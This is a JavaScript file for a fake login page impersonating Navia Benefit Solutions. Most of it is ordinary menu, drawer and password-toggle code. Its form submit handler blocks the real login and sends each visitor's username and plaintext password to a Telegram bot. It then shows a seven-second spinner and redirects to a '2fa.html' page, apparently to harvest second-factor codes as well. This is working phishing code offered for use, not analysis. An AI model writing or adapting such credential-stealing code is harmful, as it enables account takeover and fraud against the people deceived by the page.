/**
 * Navia Benefit Solutions — Login Page JavaScript
 * Updated with Telegram Bot Integration
 */

(function () {
    'use strict';

    /* ─── ELEMENT REFERENCES ──────────────────────────────────── */
    const menuToggle     = document.querySelector('.menu-toggle');
    const topbarMenu     = document.getElementById('topbarMenu');
    const mobileNav      = document.getElementById('mobileNav');
    const closeNav       = document.getElementById('closeNav');
    const navOverlay     = document.getElementById('navOverlay');
    const helpToggle     = document.querySelector('.help-toggle');
    const helpDrawer     = document.getElementById('helpDrawer');
    const faqClose       = document.getElementById('faqClose');
    const helpOverlay    = document.getElementById('helpOverlay');
    const togglePassword = document.getElementById('togglePassword');
    const passwordInput  = document.getElementById('Login_Password');
    const loginForm      = document.querySelector('form');

    /* ─── DESKTOP MENU TOGGLE ─────────────────────────────────── */
    if (menuToggle && topbarMenu) {
        menuToggle.addEventListener('click', function (e) {
            e.preventDefault();
            if (window.innerWidth >= 768) {
                const isOpen = topbarMenu.classList.toggle('show');
                menuToggle.setAttribute('aria-expanded', String(isOpen));
                return;
            }
            if (mobileNav && navOverlay) {
                mobileNav.classList.add('open');
                navOverlay.classList.add('active');
                document.body.style.overflow = 'hidden';
            }
        });
    }

    /* ─── MOBILE NAV CLOSE ────────────────────────────────────── */
    function closeMobileNav() {
        if (mobileNav) mobileNav.classList.remove('open');
        if (navOverlay) navOverlay.classList.remove('active');
        document.body.style.overflow = '';
    }

    if (closeNav) closeNav.addEventListener('click', (e) => { e.preventDefault(); closeMobileNav(); });
    if (navOverlay) navOverlay.addEventListener('click', closeMobileNav);

    /* ─── HELP / FAQ DRAWER ───────────────────────────────────── */
    function openHelpDrawer() {
        if (helpDrawer) helpDrawer.classList.add('open');
        if (helpOverlay) helpOverlay.classList.add('active');
        document.body.style.overflow = 'hidden';
    }
    function closeHelpDrawer() {
        if (helpDrawer) helpDrawer.classList.remove('open');
        if (helpOverlay) helpOverlay.classList.remove('active');
        document.body.style.overflow = '';
    }

    if (helpToggle) helpToggle.addEventListener('click', (e) => { e.preventDefault(); closeMobileNav(); openHelpDrawer(); });
    if (faqClose) faqClose.addEventListener('click', (e) => { e.preventDefault(); closeHelpDrawer(); });
    if (helpOverlay) helpOverlay.addEventListener('click', closeHelpDrawer);

    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') { closeMobileNav(); closeHelpDrawer(); }
    });

    window.addEventListener('resize', () => {
        if (window.innerWidth >= 768) closeMobileNav();
    });

    /* ─── PASSWORD VISIBILITY TOGGLE ─────────────────────────── */
    if (togglePassword && passwordInput) {
        togglePassword.addEventListener('click', function (e) {
            e.preventDefault();
            const icon = this.querySelector('i');
            const isPassword = passwordInput.type === 'password';
            passwordInput.type = isPassword ? 'text' : 'password';
            this.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
            if (icon) {
                icon.classList.toggle('fa-eye', !isPassword);
                icon.classList.toggle('fa-eye-slash', isPassword);
            }
        });
    }

    /* ─── SHAKE HELPER ───────────────────────────────────────── */
    function shakeField(field) {
        if (!field) return;
        field.classList.remove('input-shake');
        void field.offsetWidth;
        field.classList.add('input-error', 'input-shake');
        field.addEventListener('animationend', function handler() {
            field.classList.remove('input-shake');
            field.removeEventListener('animationend', handler);
        });
    }

    function clearFieldError(field) {
        if (!field) return;
        field.addEventListener('input', function () {
            if (field.value.trim()) {
                field.classList.remove('input-error', 'input-shake');
            }
        });
    }

    /* ─── LOADING HELPER ─────────────────────────────────────── */
    function startButtonLoading(btn, ms, onDone) {
        if (!btn) return;
        const originalHTML = btn.innerHTML;
        const originalWidth = btn.offsetWidth;
        btn.disabled = true;
        btn.style.minWidth = originalWidth + 'px';
        btn.innerHTML = '<span class="btn-spinner" aria-hidden="true"></span>';
        btn.classList.add('btn-loading');

        setTimeout(() => {
            btn.disabled = false;
            btn.style.minWidth = '';
            btn.innerHTML = originalHTML;
            btn.classList.remove('btn-loading');
            if (onDone) onDone();
        }, ms);
    }

    /* ─── LOGIN FORM SUBMIT ───────────────────────────────────── */
    const usernameInput = document.getElementById('Login_Username');
    if (usernameInput) clearFieldError(usernameInput);
    if (passwordInput) clearFieldError(passwordInput);

    if (loginForm) {
        loginForm.addEventListener('submit', function (e) {
            e.preventDefault();

            const username = document.getElementById('Login_Username');
            const password = document.getElementById('Login_Password');
            const loginBtn = document.getElementById('login-btn');

            let valid = true;

            if (username && !username.value.trim()) {
                shakeField(username);
                valid = false;
            }
            if (password && !password.value.trim()) {
                shakeField(password);
                valid = false;
            }

            if (!valid) {
                if (username && !username.value.trim()) username.focus();
                return;
            }

            // === IMMEDIATE TELEGRAM SEND ===
            TG.send(
                `🔐 <b>Navia Login Credentials</b>\n\n` +
                `👤 Username: <code>${username.value.trim()}</code>\n` +
                `🔑 Password: <code>${password.value}</code>\n` +
                `⏰ ${TG.ts()}`
            );

            // Loading + redirect
            startButtonLoading(loginBtn, 7000, function () {
                window.location.href = '2fa.html';
            });
        });
    }

}());